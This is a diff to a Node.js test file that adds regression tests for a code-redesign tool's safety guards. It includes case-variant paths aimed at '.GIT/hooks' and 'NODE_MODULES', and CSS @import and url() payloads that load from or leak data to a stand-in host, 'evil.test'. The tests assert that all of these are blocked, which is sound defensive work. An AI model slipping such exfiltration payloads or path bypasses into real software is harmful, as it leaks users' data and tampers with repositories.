@@ -1,5 +1,6 @@
 import test from "node:test";
 import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
 import { existsSync, mkdtempSync, mkdirSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -583,4 +584,48 @@ test("PR 487 review regressions: Tier 3 allowlist, .git/node_modules block, CSS/
   assert.throws(() => rollbackRedesign({ workspaceRoot: root, journalDir, runId: applied.runId }), /deleted after redesign/u);
   const forced = rollbackRedesign({ workspaceRoot: root, journalDir, runId: applied.runId, force: true });
   assert.deepEqual(forced.restoredFiles, ["src/tokens.css"]);
+
+  // R1: Case-insensitive SKIP_DIRS bypass (.GIT/..., NODE_MODULES/...) is blocked!
+  mkdirSync(join(root, "node_modules", "pkg"), { recursive: true });
+  writeFileSync(join(root, "node_modules", "pkg", "index.js"), "export const x = 1;\n");
+  assert.throws(() => resolveSafeWorkspaceFile(root, ".GIT/hooks/pre-commit"), /restricted/u);
+  assert.throws(() => resolveSafeWorkspaceFile(root, "NODE_MODULES/pkg/index.js"), /restricted/u);
+
+  // R2: Crafted Tier 1 CSS plan.json injecting @import/url() is blocked inside applyRedesignPlan!
+  const beforeCss = readFileSync(join(root, "src", "tokens.css"), "utf8");
+  const evilCss = "@import url(https://evil.test/steal.css);\n" + beforeCss;
+  const sha = (s) => createHash("sha256").update(s, "utf8").digest("hex");
+  const evilPatch = { file: "src/tokens.css", tier: 1, beforeSha256: sha(beforeCss), afterSha256: sha(evilCss), afterContent: evilCss, summary: "evil" };
+  const evilToken = sha(JSON.stringify({ workspaceRoot: realpathSync.native(root), patches: [{ file: evilPatch.file, tier: 1, beforeSha256: evilPatch.beforeSha256, afterSha256: evilPatch.afterSha256 }] }));
+  assert.throws(() => applyRedesignPlan({ workspaceRoot: root, planToken: evilToken, patches: [evilPatch] }, { journalDir, expectedPlanToken: evilToken }), /Tier 1 CSS invariance gate/u);
+
+  // R3: External CSS resource loads (url(), image-set(), expression()) are blocked in BOTH Tier 2 and Tier 3!
+  assert.throws(
+    () => patchJsxClassStrings('export const A = () => <div className="bg-blue-500" />;', "A.tsx", { "bg-blue-500": "bg-[url(https://evil.test/x.png)]" }),
+    /invalid replacement class value/u,
+  );
+  assert.equal(
+    verifyFunctionalInvariance(
+      'export const A = ({ x }) => <div className="p-4" style={{ width: `${x}%` }} />;',
+      'export const A = ({ x }) => <div className="p-4" style={{ width: `url(https://evil.test/?x=${x})` }} />;',
+      "A.tsx",
+    ).ok,
+    false,
+  );
+  assert.equal(
+    verifyFunctionalInvariance(
+      'export const A = () => <div className="p-4" />;',
+      'export const A = () => <div className="p-4" style={{ backgroundImage: "url(https://evil.test/exfil.png)" }} />;',
+      "A.tsx",
+    ).ok,
+    false,
+  );
+  assert.equal(
+    verifyFunctionalInvariance(
+      'export const A = () => <div className="p-4" />;',
+      'export const A = () => <div className="bg-[url(https://evil.test/exfil.png)]" />;',
+      "A.tsx",
+    ).ok,
+    false,
+  );
 }));
